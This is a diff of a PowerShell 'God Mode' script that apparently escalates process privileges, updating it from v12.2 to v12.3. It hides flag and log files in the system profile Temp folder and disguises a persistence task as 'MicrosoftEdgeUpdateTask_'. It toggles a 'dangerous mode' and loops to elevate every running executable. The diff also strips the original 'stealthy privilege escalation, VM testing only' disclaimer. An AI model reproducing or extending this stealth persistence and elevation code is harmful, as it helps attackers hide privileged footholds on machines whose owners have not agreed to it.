@@ -2,48 +2,43 @@
 
 <#
 .SYNOPSIS
-    God Mode v12.2 - Final Improved Version
-.DESCRIPTION
-    Stealthy + Dangerous privilege escalation tool.
-    For VM security testing only.
+    God Mode v12.3 - Weaknesses Improved
 #>
 
 param(
     [switch]$ToggleOn,
     [switch]$ToggleOff,
     [switch]$Status,
-    [switch]$Launch
+    [switch]$Launch,
+    [switch]$Verbose
 )
 
 $FlagFile   = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
 $LogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
 $TaskPrefix = "MicrosoftEdgeUpdateTask_"
 
-# ============================================================
-#  SECURITY CHECK
-# ============================================================
+# Security Check
 function Test-BuiltInAdmin {
     $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
     return ($sid -like "*-500")
 }
 
 if (-not (Test-BuiltInAdmin) -and -not $Status) {
-    Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use this tool.`n" -ForegroundColor Red
+    Write-Host "`n[ACCESS DENIED] Only Built-in Administrator can use this tool.`n" -ForegroundColor Red
     exit 1
 }
 
-# ============================================================
-#  LOGGING
-# ============================================================
 function Write-Log {
     param([string]$Message, [string]$Level = "INFO")
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     "[$timestamp] [$Level] $Message" | Out-File $LogFile -Append -Encoding UTF8
+    
+    if ($Verbose -or $Level -in @("ERROR", "WARN")) {
+        Write-Host "[$timestamp] [$Level] $Message"
+    }
 }
 
-# ============================================================
-#  DANGEROUS MODE
-# ============================================================
+# Dangerous Settings
 function Enable-DangerousMode {
     Write-Log "Enabling dangerous mode..." "WARN"
     try {
@@ -73,9 +68,7 @@ function Disable-DangerousMode {
     }
 }
 
-# ============================================================
-#  STEALTH TASK
-# ============================================================
+# Stealth Task
 function Register-StealthTask {
     $taskName = $TaskPrefix + (Get-Random -Minimum 10000 -Maximum 99999)
     Unregister-StealthTask
@@ -96,9 +89,7 @@ function Unregister-StealthTask {
         Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
 }
 
-# ============================================================
-#  PROCESS ELEVATION (with improved duplicate prevention)
-# ============================================================
+# Improved Elevation with Duplicate Prevention
 function Elevate-Process {
     param([string]$Path)
     if (-not (Test-Path $Path)) { return }
@@ -120,9 +111,7 @@ function Elevate-Process {
     }
 }
 
-# ============================================================
-#  MONITORING LOOP (Improved)
-# ============================================================
+# Improved Monitoring Loop
 function Start-Monitoring {
     if (-not (Test-Path $FlagFile)) {
         Write-Log "God Mode is not enabled." "ERROR"
@@ -131,7 +120,7 @@ function Start-Monitoring {
 
     Write-Log "Monitoring started." "INFO"
 
-    $lastElevated = @{}   # Tracks when each process was last elevated
+    $lastElevated = @{}
 
     while ($true) {
         Start-Sleep -Seconds 2
@@ -146,9 +135,9 @@ function Start-Monitoring {
                 if ($proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe") {
                     $path = $proc.ExecutablePath
 
-                    # Only elevate if not elevated recently (within last 30 seconds)
+                    # Improved duplicate prevention (30-second cooldown)
                     if (-not $lastElevated.ContainsKey($path) -or 
-                        ($lastElevated[$path] -lt (Get-Date).AddSeconds(-30))) {
+                        $lastElevated[$path] -lt (Get-Date).AddSeconds(-30)) {
 
                         $lastElevated[$path] = Get-Date
                         Elevate-Process $path
@@ -157,15 +146,13 @@ function Start-Monitoring {
             }
         }
         catch {
-            Write-Log "Monitoring error: $_" "ERROR"
+            Write-Log "Monitoring error (recovering...): $_" "ERROR"
             Start-Sleep -Seconds 5
         }
     }
 }
 
-# ============================================================
-#  TOGGLE & STATUS
-# ============================================================
+# Toggle Functions
 function Enable-GodMode {
     "1" | Out-File $FlagFile -Force
     Register-StealthTask
@@ -188,12 +175,10 @@ function Show-Status {
     }
 }
 
-# ============================================================
-#  INTERACTIVE MENU
-# ============================================================
+# Interactive Menu
 function Show-Menu {
     Clear-Host
-    Write-Host "=== GOD MODE v12.2 ===" -ForegroundColor Cyan
+    Write-Host "=== GOD MODE v12.3 ===" -ForegroundColor Cyan
     Write-Host ""
     Write-Host "1. Enable God Mode"
     Write-Host "2. Disable God Mode"
@@ -202,7 +187,7 @@ function Show-Menu {
     Write-Host "5. Exit"
     Write-Host ""
 
-    $choice = Read-Host "Select an option (1-5)"
+    $choice = Read-Host "Select option (1-5)"
 
     switch ($choice) {
         "1" { Enable-GodMode; Write-Host "God Mode enabled." -ForegroundColor Green; Start-Sleep -Seconds 2; Show-Menu }
@@ -214,10 +199,7 @@ function Show-Menu {
     }
 }
 
-# ============================================================
-#  MAIN
-# ============================================================
-
+# Main
 if ($ToggleOn)  { Enable-GodMode; exit }
 if ($ToggleOff) { Disable-GodMode; exit }
 if ($Status)    { Show-Status; exit }
